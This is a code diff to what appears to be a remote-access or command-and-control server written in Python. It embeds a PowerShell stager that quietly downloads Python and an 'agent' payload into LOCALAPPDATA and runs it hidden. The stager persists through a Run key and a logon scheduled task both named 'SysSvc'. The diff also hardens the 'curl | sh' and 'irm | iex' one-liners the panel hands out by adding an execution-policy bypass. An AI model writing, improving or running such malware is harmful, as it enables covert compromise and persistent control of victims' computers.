@@ -124,7 +124,7 @@ echo "[+] done"
 PSH = r"""$ErrorActionPreference="Stop"
 $ProgressPreference="SilentlyContinue"
 try{[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12}catch{}
-$B="__B__"; $d="$env:TEMP\svc"; $ua="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
+$B="__B__"; $d="$env:LOCALAPPDATA\svc"; $ua="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
 New-Item -ItemType Directory -Force $d | Out-Null
 $log="$d\boot.log"
 function Log($m){ try{ Add-Content -Path $log -Value ((Get-Date -Format "HH:mm:ss")+" "+$m) }catch{} }
@@ -137,31 +137,36 @@ function Get($u,$o){
   }
   return $false
 }
+function OK($exe){
+  if(-not $exe -or -not (Test-Path $exe)){ return $false }
+  try{
+    $p = Start-Process -FilePath $exe -ArgumentList '-c','print(1)' -NoNewWindow -PassThru -Wait -ErrorAction Stop
+    if($p.ExitCode -eq 0){ return $true }
+    Log "bad exe rc=$($p.ExitCode): $exe"
+  }catch{ Log "bad exe: $exe" }
+  return $false
+}
 Log "start"
-$py="$d\python.exe"
-$have = $null
-if(Test-Path $py){ $have = $py }
-if(-not $have){ $have = (Get-Command python -ErrorAction SilentlyContinue).Source }
-if(-not $have){
+$py="$d\python.exe"; $have=$null
+
+if(-not (OK $py)){
   if((Get "$B/py" "$d\py.zip") -and ((Get-Item "$d\py.zip").Length -gt 1000000)){
     try{ Expand-Archive "$d\py.zip" $d -Force }catch{ Log "unzip: $_" }
   }
-  if(Test-Path $py){ $have = $py }
+  if(OK $py){ $have=$py }
+}
+if(-not $have){
+  $c=(Get-Command python -ErrorAction SilentlyContinue).Source
+  if(OK $c){ $have=$c; Log "sys: $c" }
 }
 if(-not $have){ Log "no python"; throw "python missing" }
 Log "python: $have"
+
 if(-not (Get "$B/a" "$d\k.py")){ Log "payload fail"; throw "payload fetch failed" }
 if((Get-Item "$d\k.py").Length -lt 500){ Log "payload short"; throw "payload corrupt" }
 
 $run="$d\run.cmd"
 Set-Content -Path $run -Encoding ASCII -Value ('@echo off'+"`r`n"+'start "" "'+$have+'" "'+"$d\k.py"+'"'+"`r`n")
-$tr = '"'+$run+'"'
-try{
-  New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name SysSvc -Value $tr -PropertyType String -Force | Out-Null
-  Log "run-key ok"
-}catch{ Log "run-key: $_" }
-try{ & cmd /c "schtasks /delete /tn SysSvc /f >nul 2>&1" }catch{}
-try{ & cmd /c "schtasks /create /tn SysSvc /tr $tr /sc onlogon /f" | Out-Null; Log "task ok" }catch{ Log "task: $_" }
 
 $psi = New-Object Diagnostics.ProcessStartInfo
 $psi.FileName = $have
@@ -169,9 +174,19 @@ $psi.Arguments = '"'+"$d\k.py"+'"'
 $psi.WorkingDirectory = $d
 $psi.WindowStyle = "Hidden"
 $psi.CreateNoWindow = $true
-$psi.UseShellExecute = $true
-[Diagnostics.Process]::Start($psi) | Out-Null
-Log "spawned"
+$psi.UseShellExecute = $false
+$pr = [Diagnostics.Process]::Start($psi)
+Log "spawned pid=$($pr.Id)"
+Start-Sleep -Seconds 6
+if($pr.HasExited){ Log "died rc=$($pr.ExitCode)"; throw "agent exited" }
+Log "alive"
+
+try{
+  New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name SysSvc -Value ('"'+$run+'"') -PropertyType String -Force | Out-Null
+  Log "run-key ok"
+}catch{ Log "run-key: $_" }
+try{ & cmd /c "schtasks /delete /tn SysSvc /f >nul 2>&1" }catch{}
+try{ & cmd /c "schtasks /create /tn SysSvc /tr ""$run"" /sc onlogon /f" | Out-Null; Log "task ok" }catch{ Log "task: $_" }
 """
 
 PANEL = r"""<!doctype html>
@@ -492,7 +507,7 @@ function drawLinks(){
   const o = location.origin;
   $("#links").innerHTML =
     '<div>linux / termux</div><code>curl -fsSL ' + esc(o) + '/i | sh</code>' +
-    '<div>windows</div><code>powershell -w hidden -c "irm ' + esc(o) + '/i.ps1 | iex"</code>';
+    '<div>windows</div><code>powershell -NoProfile -ExecutionPolicy Bypass -w hidden -c "irm ' + esc(o) + '/i.ps1 | iex"</code>';
   for (const c of document.querySelectorAll(".links code")){
     c.title = "click to copy";
     c.style.cursor = "pointer";
@@ -585,7 +600,7 @@ class H(BaseHTTPRequestHandler):
             if not self.auth():
                 return
             o = base_of(self)
-            return self.snd(200, "linux:  curl -fsSL %s/i | sh\nwindows: powershell -w hidden -c \"irm %s/i.ps1 | iex\"\n" % (o, o))
+            return self.snd(200, "linux:  curl -fsSL %s/i | sh\nwindows: powershell -NoProfile -ExecutionPolicy Bypass -w hidden -c \"irm %s/i.ps1 | iex\"\n" % (o, o))
 
         if p == "/py":
             if PYC["d"]:
